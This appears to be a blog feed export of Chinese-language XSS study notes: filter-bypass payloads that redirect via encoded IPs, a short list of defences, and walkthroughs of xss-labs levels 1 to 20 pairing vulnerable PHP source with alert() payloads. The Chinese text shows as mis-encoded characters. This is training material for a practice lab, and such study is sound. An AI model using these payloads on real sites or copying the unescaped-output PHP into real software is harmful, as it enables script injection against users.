<h3 id="è¿‡æ»¤url"><a href="#è¿‡æ»¤url" class="headerlink" title="è¿‡æ»¤url"></a>è¿‡æ»¤url</h3><h4 id="urlç¼–ç "><a href="#urlç¼–ç " class="headerlink" title="urlç¼–ç "></a>urlç¼–ç </h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="IPç»•è¿‡"><a href="#IPç»•è¿‡" class="headerlink" title="IPç»•è¿‡"></a>IPç»•è¿‡</h4><ul>
<li>åè¿›åˆ¶IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"># 127.0.0.1</span><br></pre></td></tr></table></figure>

<ul>
<li>å…«è¿›åˆ¶IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>HEX</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>htmlæ ‡ç­¾ä¸­ä½¿ç”¨<code>//</code> ä»£æ›¿<code>http://</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="XSSé˜²å¾¡"><a href="#XSSé˜²å¾¡" class="headerlink" title="XSSé˜²å¾¡"></a>XSSé˜²å¾¡</h2><ul>
<li>é»‘/ç™½åå•</li>
<li>å¯¹è¾“å‡ºç¼–ç </li>
<li>å¯¹è¾“å…¥è¿‡æ»¤</li>
</ul>
<blockquote>
<p>è¿‡æ»¤ä¸€äº›å±é™©å­—ç¬¦ï¼Œä»¥åŠè½¬ä¹‰ || &lt; &gt; â€˜ â€œ &amp; # ç­‰å±é™©å­—ç¬¦</p>
</blockquote>
<ul>
<li>HttpOnly Cookieè®¾ç½®</li>
</ul>
<blockquote>
<p>Cookieåœ¨æ¶ˆæ¯å¤´ä¸­è¢«è®¾ç½®ä¸ºHttpOnly,å¯ä»¥é˜»æ­¢å®¢æˆ·ç«¯JSç›´æ¥è®¿é—®æµè§ˆå™¨ä¸­çš„cookiesï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤æ•æ„Ÿæ•°æ®çš„ä½œç”¨</p>
</blockquote>
<ul>
<li><p>é™åˆ¶è¾“å…¥å†…å®¹é•¿åº¦</p>
</li>
<li><p>CSP(Content Security Policy)</p>
</li>
</ul>
<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p>
<p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p>
<p><a href="https://blog.csdn.net/weixin_51356351/article/details/109690416">https://blog.csdn.net/weixin_51356351/article/details/109690416</a></p>
<p><a href="https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/">https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs2</title>
    <url>/posts/b04952e9/</url>
    <content><![CDATA[<p>14</p>
<p>è¿™ä¸ªé¢˜ç›®ä¸­çš„urlå¤±æ•ˆäº†ï¼Œè€ƒå¯Ÿçš„æ˜¯exif xss</p>
<p> exifä»‹ç»:</p>
<p>å¯äº¤æ¢å›¾åƒæ–‡ä»¶æ ¼å¼ï¼ˆè‹±è¯­ï¼šExchangeable image file formatï¼Œå®˜æ–¹ç®€ç§°Exifï¼‰ï¼Œæ˜¯ä¸“é—¨ä¸ºæ•°ç ç›¸æœºçš„ç…§ç‰‡è®¾å®šçš„ï¼Œå¯ä»¥è®°å½•æ•°ç ç…§ç‰‡çš„å±æ€§ä¿¡æ¯å’Œæ‹æ‘„æ•°æ®ã€‚</p>
<p>exif xss ç®€å•æ¥è®²å°±æ˜¯åˆ©ç”¨exifä¿¡æ¯å®ç°xssæ”»å‡»ã€‚ </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">xss</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">12</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>15</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ng-include </code>æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p>
<p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚<br><code>ng-include</code> å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p>
</blockquote>
<p>è¿™é‡Œè€ƒè™‘è°ƒç”¨level1çš„ä»£ç ï¼Œä½¿ç”¨img</p>
<p><code> http://test.ctf8.com/level15.php?src=%27level1.php?name=test&lt;img src=1 onclick=alert(1)&gt;&#39;</code></p>
<br>

<br>

<p>16.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤æ‰äº†<code>script</code>, ç©ºæ ¼å’Œ<code>/</code>å¯ä»¥è€ƒè™‘ä½¿ç”¨%0A,%0C,%0Dç­‰ä»£æ›¿ä½œä¸ºåˆ†éš”ç¬¦</p>
<p><code>keyword=test&lt;img%0Asrc=1%0Aonclick=alert(1)&gt;</code></p>
<br>

<h4 id="16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹"><a href="#16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹" class="headerlink" title="16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹"></a>16é¢˜ä»¥åçš„é¢˜ç›®éƒ½éœ€è¦ä½¿ç”¨flashï¼Œå¥½å¤šæµè§ˆå™¨å·²ç»ä¸æ”¯æŒäº†ï¼Œåé¢çš„å°±éšä¾¿çœ‹çœ‹</h4><p>17.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>18.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å’Œ17é¢˜ä¸€æ ·</p>
<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>19.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p>20.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf04.swf?&#x27;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs1</title>
    <url>/posts/ca3eea61/</url>
    <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
<p>1.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$strè¢«æ”¾å…¥åˆ°äº† h2æ ‡ç­¾ä¸­ï¼Œåªéœ€è¦æŠŠå‰é¢h2æ ‡ç­¾é—­åˆæ„é€ payloadï¼Œ</p>
<p><code>name=&lt;/h2&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code></p>
<br>

<p>2.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é—­åˆvalue</p>
<p><code>keyword=test&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;</code></p>
<br>

<p>3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸ä¸Šä¸€é¢˜ç›¸æ¯”ï¼Œè¿™é‡Œä½¿ç”¨äº† <code> htmlspecialchars()</code>å‡½æ•°ï¼Œä»–ä¼šæŠŠ<code>&lt;</code>å’Œ<code>&gt;</code>è½¬è¯‘ä¸ºhtmlå®ä½“</p>
<p>æŸ¥çœ‹æºç å¯ä»¥å‘ç°<code>&lt;</code>å’Œ<code>&gt;</code>éƒ½è¢«è½¬è¯‘æ‰äº†ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå¯ä»¥è€ƒè™‘ä½¿ç”¨onä¸€ç±»çš„äº‹ä»¶å¼¹xss</p>
<p><code>keyword=&#39;onclick=alert(3)//</code> é—­åˆå‰é¢çš„value æ³¨é‡Šæ‰åé¢çš„å•å¼•å·</p>
<br>

<p>4.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å’Œä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œåªä¸è¿‡æ˜¯ç”¨åŒå¼•å·é—­åˆ</p>
<p><code>keyword=&quot;oninput=alert(4)//</code></p>
<br>

<p>5.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ¬¡æ˜¯æŠŠ&lt;script å’Œ on éƒ½ç»™æ›¿æ¢äº†ï¼Œæ‰€ä»¥è€ƒè™‘<code>a href</code> æ¥è§¦å‘</p>
<p><code>123&quot;&gt;&lt;a href=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<br>

<p>6.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶æŠŠhrefç»™æ”¹äº† ä½†å¯ä»¥è€ƒè™‘å˜åŒ–å¤§å°å†™</p>
<p><code>123&quot;&gt;&lt;a hREf=javascript:alert(1) &gt;XSS&lt;/a&gt;</code></p>
<p>7.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>123&quot;&gt;&lt;scriscriptpt&gt;alert(7)&lt;/scrscriptipt&gt;//</code></p>
<p><code>123&quot;oonnclick=alert(7) //</code></p>
<br>

<p>8.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>javascrip&amp;#x74;:alert(1)//</code>æˆ–è€…</p>
<p><code>javascr%09ipt:alert(1)</code> %09å¯¹å…³é”®å­—éš”æ–­ ç„¶åè¿›è¡Œå®ä½“ç¼–ç <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
<br>

<br>

<p>9.</p>
